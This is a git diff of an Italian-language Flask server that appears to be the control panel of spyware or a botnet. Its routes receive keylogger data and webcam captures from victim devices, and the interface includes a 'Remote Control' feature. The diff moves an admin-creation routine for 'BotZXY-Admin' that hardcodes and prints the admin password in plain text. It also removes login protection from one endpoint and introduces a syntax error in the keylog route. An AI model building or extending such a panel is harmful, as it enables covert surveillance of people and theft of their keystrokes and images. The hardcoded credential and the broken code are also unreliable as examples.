@@ -363,7 +363,7 @@ def upload_webcam(device_id):
     except:
         return jsonify({'error': 'Errore'}), 500
 
-@app.route('/api/keylog/<device_id>', methods=['POST'])
+@app.route('/api/keylog/<device_id>', methods(['POST'])
 def upload_keylog(device_id):
     if not supabase:
         return jsonify({'error': 'Database non configurato'}), 500
@@ -409,11 +409,10 @@ def get_activity_chart():
     if not supabase:
         return jsonify({'labels': [], 'data': []})
     try:
-        # Simula dati (in produzione usa query SQL su Supabase)
         hours = [f"{str(i).zfill(2)}:00" for i in range(24)]
         return jsonify({
             'labels': hours,
-            'data': [0] * 24  # Dati reali da implementare
+            'data': [0] * 24
         })
     except:
         return jsonify({'labels': [], 'data': []})
@@ -458,8 +457,8 @@ def save_settings():
 
 # ============ TRADUZIONI ============
 @app.route('/api/translations', methods=['GET'])
-@login_required
 def get_translations():
+    """Traduzioni per l'interfaccia - SENZA login_required per funzionare sulla pagina di login"""
     lang = request.args.get('lang', 'it')
     translations = {
         'it': {
@@ -488,7 +487,9 @@ def get_translations():
             'dark': 'Scuro', 'light': 'Chiaro', 'blue': 'Blu', 'green': 'Verde',
             'purple': 'Viola', 'orange': 'Arancione', 'cyber': 'Cyber', 'matrix': 'Matrix',
             'lang_it': 'Italiano', 'lang_en': 'English', 'lang_fr': 'Français',
-            'lang_es': 'Español', 'lang_de': 'Deutsch', 'remote': 'Controllo Remoto'
+            'lang_es': 'Español', 'lang_de': 'Deutsch', 'remote': 'Controllo Remoto',
+            'username_label': 'Username', 'password_label': 'Password',
+            'login_btn_label': 'ACCEDI AL DASHBOARD', 'loading_label': 'Accesso in corso...'
         },
         'en': {
             'dashboard': 'Dashboard', 'devices': 'Devices', 'captures': 'Captures',
@@ -516,31 +517,14 @@ def get_translations():
             'dark': 'Dark', 'light': 'Light', 'blue': 'Blue', 'green': 'Green',
             'purple': 'Purple', 'orange': 'Orange', 'cyber': 'Cyber', 'matrix': 'Matrix',
             'lang_it': 'Italian', 'lang_en': 'English', 'lang_fr': 'French',
-            'lang_es': 'Spanish', 'lang_de': 'German', 'remote': 'Remote Control'
+            'lang_es': 'Spanish', 'lang_de': 'German', 'remote': 'Remote Control',
+            'username_label': 'Username', 'password_label': 'Password',
+            'login_btn_label': 'ACCESS DASHBOARD', 'loading_label': 'Logging in...'
         }
     }
     return jsonify(translations.get(lang, translations['it']))
 
-# ============ ADMIN SETUP ============
-def setup_admin_user():
-    if not supabase:
-        print("⚠️ Supabase non configurato, admin non creato!")
-        return
-    try:
-        existing = supabase.table('users').select('*').eq('username', 'BotZXY-Admin').execute()
-        if not existing.data:
-            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
-            password_hash = hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest()
-            supabase.table('users').insert({
-                'username': 'BotZXY-Admin',
-                'password_hash': password_hash,
-                'api_key': api_key
-            }).execute()
-            print('[+] Admin creato: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
-    except Exception as e:
-        print(f"[-] Admin creation error: {e}")
-
-# ============ LOGS API ============
+# ============ LOGS ============
 @app.route('/api/logs', methods=['GET'])
 @login_required
 def get_logs():
@@ -591,6 +575,25 @@ def change_password():
         return jsonify({'status': 'password_updated'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+# ============ ADMIN SETUP ============
+def setup_admin_user():
+    if not supabase:
+        print("⚠️ Supabase non configurato, admin non creato!")
+        return
+    try:
+        existing = supabase.table('users').select('*').eq('username', 'BotZXY-Admin').execute()
+        if not existing.data:
+            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
+            password_hash = hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest()
+            supabase.table('users').insert({
+                'username': 'BotZXY-Admin',
+                'password_hash': password_hash,
+                'api_key': api_key
+            }).execute()
+            print('[+] Admin creato: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
+    except Exception as e:
+        print(f"[-] Admin creation error: {e}")
 
 # ============ MAIN ============
 if __name__ == '__main__':
